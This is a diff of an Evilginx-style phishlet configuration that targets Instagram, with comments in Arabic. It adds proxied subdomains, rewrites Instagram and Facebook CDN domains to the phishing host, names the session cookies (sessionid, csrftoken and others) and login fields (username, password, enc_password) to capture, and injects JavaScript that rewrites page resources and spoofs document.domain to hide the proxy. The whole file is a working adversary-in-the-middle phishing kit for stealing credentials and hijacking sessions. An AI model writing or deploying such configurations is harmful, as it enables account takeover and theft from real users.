@@ -6,19 +6,21 @@ proxy_hosts:
   - { phish_sub: 'help', orig_sub: 'help', domain: 'instagram.com' }
   - { phish_sub: 'about', orig_sub: 'about', domain: 'instagram.com' }
   - { phish_sub: 'blog', orig_sub: 'blog', domain: 'instagram.com' }
-  - { phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com' } # إضافة نطاقات CDN
+  # إضافة نطاقات CDN الضرورية
+  - { phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com' }
+  - { phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com' }
+  - { phish_sub: 'graph', orig_sub: 'graph', domain: 'instagram.com' }
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'instagram.com' }
 
 sub_filters:
-  # مرشحات قوية لاستبدال جميع أشكال النطاق في جميع أنواع المحتوى
   - hostname: '{hostname}'
     sub: 'www'
     domain: 'instagram.com'
-    search: '(?:https?:)?(?:\/\/)?(?:[a-zA-Z0-9.-]+\.)*instagram\.com'
+    search: '(?:https?:)?(?:\/\/)?(?:[a-zA-Z0-9-]+\.)*(?:instagram\.com|cdninstagram\.com|fbcdn\.net)'
     replace: 'https://{hostname}'
-    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain', 'image/svg+xml']
+    mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/*', 'font/*']
 
 auth_tokens:
-  # قائمة موسعة من Evilginx3-Phishlets
   - 'sessionid'
   - 'ds_user_id'
   - 'csrftoken'
@@ -28,17 +30,12 @@ auth_tokens:
   - 'datr'
   - 'shbid'
   - 'shbts'
-  - 'fbm_'
-  - 'wd'
-  - 'rur'
 
 creds_fields:
-  # قائمة موسعة
   - 'username'
   - 'password'
   - 'emailOrPhone'
   - 'enc_password'
-  - 'encrypted_password'
 
 auth_urls:
   - 'https://www.instagram.com/accounts/onetap/?next=%2F'
@@ -46,17 +43,20 @@ auth_urls:
   - 'https://www.instagram.com/'
 
 js_inject: |
-  // حقن JavaScript متقدم
+  // إصلاح الروابط ديناميكياً في المتصفح كخطة احتياطية
   (function() {
-      // منع اكتشاف البروكسي عبر window.location
-      Object.defineProperty(window.location, 'hostname', { get: function() { return 'www.instagram.com'; } });
-      Object.defineProperty(document, 'domain', { get: function() { return 'instagram.com'; } });
-
-      // إصلاح الروابط التي تحتوي على //
-      var links = document.querySelectorAll('a[href^="//"]');
-      for (var i = 0; i < links.length; i++) {
-          links[i].href = 'https://' + window.location.hostname + links[i].href.substring(2);
-      }
-
-      console.log('Phishlet Enhanced loaded.');
+    const currentHost = window.location.host;
+    const domainsToReplace = ['instagram.com', 'cdninstagram.com', 'fbcdn.net'];
+    document.querySelectorAll('link[href], script[src], img[src]').forEach(el => {
+      ['href', 'src'].forEach(attr => {
+        if (el.hasAttribute(attr)) {
+          let url = el.getAttribute(attr);
+          if (domainsToReplace.some(d => url.includes(d))) {
+            el.setAttribute(attr, url.replace(/https?:\/\/([^\/]+)/, `https://${currentHost}`));
+          }
+        }
+      });
+    });
   })();
+  // منع اكتشاف البروكسي
+  Object.defineProperty(document, 'domain', {value: 'instagram.com'});
